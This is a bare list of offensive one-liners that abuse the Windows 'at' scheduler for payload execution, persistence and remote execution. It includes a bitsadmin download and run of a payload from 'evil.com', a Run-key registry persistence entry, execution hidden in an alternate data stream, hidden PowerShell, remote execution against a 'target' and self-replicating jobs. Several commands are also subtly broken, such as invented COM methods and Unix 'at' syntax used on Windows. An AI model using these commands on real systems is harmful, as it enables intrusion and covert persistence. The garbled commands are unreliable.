          Schedule at jobs using Windows Service Control Manager: sc create AtService binPath= "at 02:00 payload.exe"
          Create nested at jobs for resilience: at 12:00 "at 12:01 'at 12:02 payload.exe'"
          Use at with alternate authentication credentials: runas /user:domain\admin "at \\target 15:00 cmd /c script.vbs"
          Create at job through COM objects: CreateObject("Schedule.Service").Create("At Job", "at 04:00 payload.exe")
          Use at with BITS for file transfer and execution: at 14:00 "bitsadmin /transfer job /download /priority high http://evil.com/payload %temp%\payload.exe"
          Abuse at for DLL search order hijacking: at 13:00 "set PATH=C:\temp;%PATH% && legitimate.exe"
          Chain at with Windows Script Host: at 16:00 "cscript //nologo script.vbs"
          Use at with alternate data streams: at 17:00 "cmd /c type payload.exe > program.exe:hidden && wmic process call create program.exe:hidden"
          Create at job through Task Scheduler COM API: Schedule.Service.ConnectServer().NewTask(0).Run("at 12:00 cmd.exe")
          Use at with Windows Management Framework: at 15:00 "pwsh -nop -w hidden -c [script block]"
          Leverage at for registry manipulation: at 18:00 "reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v payload /t REG_SZ /d cmd.exe"
          Chain at with scheduled tasks migration: at 19:00 "schtasks /create /tn backup /tr notepad.exe /sc onstart /ru system"
          Use at with DCOM for remote execution: [activator]::CreateInstance([type]::GetTypeFromProgID("Schedule.Service","target")).Create("at 12:00 cmd.exe")
          Chain at with Windows Subsystem for Linux: at now + 1 minute "wsl -e /bin/bash -c 'payload'"
          Use at with PowerShell remoting: at 14:00 "powershell -c Invoke-Command -ComputerName target -ScriptBlock {payload}"
          Create self-replicating at jobs: at 15:00 "cmd /c echo %COMMAND% | at now + 24 hours"
          Use at with Windows Named Pipes for IPC: at 16:00 "cmd /c echo payload > \\.\pipe\command_pipe"
          Chain at with Windows Services: at 17:00 "sc.exe create ServiceName binPath= 'cmd /c payload'"
